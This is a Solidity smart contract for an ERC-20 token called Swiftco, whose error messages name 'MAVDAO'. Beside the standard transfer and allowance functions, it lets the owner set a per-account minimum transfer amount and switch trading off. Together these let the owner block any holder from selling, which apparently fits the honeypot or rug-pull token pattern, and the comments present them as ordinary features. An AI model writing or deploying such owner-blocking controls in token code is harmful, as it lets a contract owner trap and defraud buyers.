pragma solidity ^0.8.3;

// ERC-20 Interface, defining standard functions for a token contract.
interface IERC20 {
    // Returns the total token supply.
    function totalSupply() external view returns (uint256);

    // Returns the account balance of another account with address `account`.
    function balanceOf(address account) external view returns (uint256);

    // Transfers `amount` tokens to `recipient`, returns a boolean value indicating success.
    function transfer(address recipient, uint256 amount) external returns (bool);

    // Returns the amount which `spender` is still allowed to withdraw from `owner`.
    function allowance(address owner, address spender) external view returns (uint256);

    // Sets `amount` as the allowance of `spender` over the caller's tokens, returns a boolean value indicating success.
    function approve(address spender, uint256 amount) external returns (bool);

    // Transfers `amount` tokens from `sender` to `recipient`, returns a boolean value indicating success.
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

    // Event emitted when tokens are transferred, including zero value transfers.
    event Transfer(address indexed from, address indexed to, uint256 value);

    // Event emitted when a successful approval is made for `spender` by `owner`.
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

// Provides basic context for `msg.sender` in contract calls.
abstract contract Context {
    // Returns the sender of the message (current call).
    function _msgSender() internal view virtual returns (address payable) {
        return payable(msg.sender);
    }
}

// Contract module which provides basic access control mechanism, where there is an account (an owner) that can be granted exclusive access to specific functions.
contract Ownable is Context {
    address private _owner;

    // Event emitted when ownership is transferred.
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    // Sets the original `owner` of the contract to the sender account.
    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    // Returns the address of the current owner.
    function owner() public view virtual returns (address) {
        return _owner;
    }

    // Modifier to make a function callable only by the owner.
    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    // Allows the current owner to relinquish control of the contract.
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0x000000000000000000000000000000000000dEaD));
        _owner = address(0x000000000000000000000000000000000000dEaD);
    }

    // Transfers ownership of the contract to a new account (`newOwner`).
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

// The main contract for the token, including ERC-20 functionality and additional features.
contract Swiftco is Context, Ownable, IERC20 {
    // Mapping from account addresses to their balances.
    mapping(address => uint256) private _balances;

    // Mapping from account addresses to a mapping of spender addresses and how much they are allowed to spend.
    mapping(address => mapping(address => uint256)) private _allowances;

    // Mapping from account addresses to their minimum transfer amounts.
    mapping(address => uint256) private _minTransferAmounts;

    // Flag to control whether trading is enabled or not.
    bool private _tradingEnabled = true;

    // Token metadata: name, symbol, and decimals.
    string private _name;
    string private _symbol;
    uint8 private _decimals;
    uint256 private _totalSupply;

    // Constructor for setting up the token.
    constructor(string memory name_, string memory symbol_, uint8 decimals_, uint256 totalSupply_) {
        _name = name_;
        _symbol = symbol_;
        _decimals = decimals_;
        _totalSupply = totalSupply_ * (10 ** uint256(decimals_));
        _balances[_msgSender()] = _totalSupply;
        emit Transfer(address(0), _msgSender(), _totalSupply);
    }

    // Returns the name of the token.
    function name() public view returns (string memory) {
        return _name;
    }

    // Returns the symbol of the token.
    function symbol() public view returns (string memory) {
        return _symbol;
    }

    // Returns the number of decimals used to get its user representation.
    function decimals() public view returns (uint8) {
        return _decimals;
    }

    // Returns the amount of tokens in existence.
    function totalSupply() public view override returns (uint256) {
        return _totalSupply;
    }

    // Returns the amount of tokens owned by `account`.
    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    // Moves `amount` tokens from the caller's account to `recipient`.
    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
        require(_tradingEnabled, "MAVDAO: Trading is currently disabled");
        require(amount >= _minTransferAmounts[_msgSender()], "MAVDAO: Transfer amount is less than the minimum allowed");
        require(_balances[_msgSender()] >= amount, "MAVDAO: transfer amount exceeds balance");
        _balances[_msgSender()] -= amount;
        _balances[recipient] += amount;
        emit Transfer(_msgSender(), recipient, amount);
        return true;
    }

    // Returns the remaining number of tokens that `spender` will be allowed to spend on behalf of `owner`.
    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    // Sets `amount` as the allowance of `spender` over the caller's tokens.
    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        _allowances[_msgSender()][spender] = amount;
        emit Approval(_msgSender(), spender, amount);
        return true;
    }

    // Moves `amount` tokens from `sender` to `recipient` using the allowance mechanism. `amount` is then deducted from the caller's allowance.
    function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {
        require(_tradingEnabled, "MAVDAO: Trading is currently disabled");
        require(amount >= _minTransferAmounts[sender], "MAVDAO: Transfer amount is less than the minimum allowed");
        require(_balances[sender] >= amount, "MAVDAO: transfer amount exceeds balance");
        require(_allowances[sender][_msgSender()] >= amount, "MAVDAO: transfer amount exceeds allowance");
        _balances[sender] -= amount;
        _balances[recipient] += amount;
        _allowances[sender][_msgSender()] -= amount;
        emit Transfer(sender, recipient, amount);
        return true;
    }

    // Event emitted when the minimum transfer amount for an account is changed.
    event MinTransferAmountChanged(address indexed account, uint256 newAmount);

    // Sets the minimum transfer amount for an `account`.
    function setMinTransferAmount(address account, uint256 newAmount) public onlyOwner {
        require(account != address(0), "MAVDAO: address zero is not a valid account");
    
        _minTransferAmounts[account] = newAmount;
        emit MinTransferAmountChanged(account, newAmount);
    }

    // Returns the minimum transfer amount for an `account`.
    function getMinTransferAmount(address account) public view returns (uint256) {
        return _minTransferAmounts[account];
    }

    // Enables or disables trading for the token.
    function setTradingEnabled(bool enabled) public onlyOwner {
        _tradingEnabled = enabled;
    }

    // Returns whether trading is enabled for the token.
    function isTradingEnabled() public view returns (bool) {
        return _tradingEnabled;
    }
}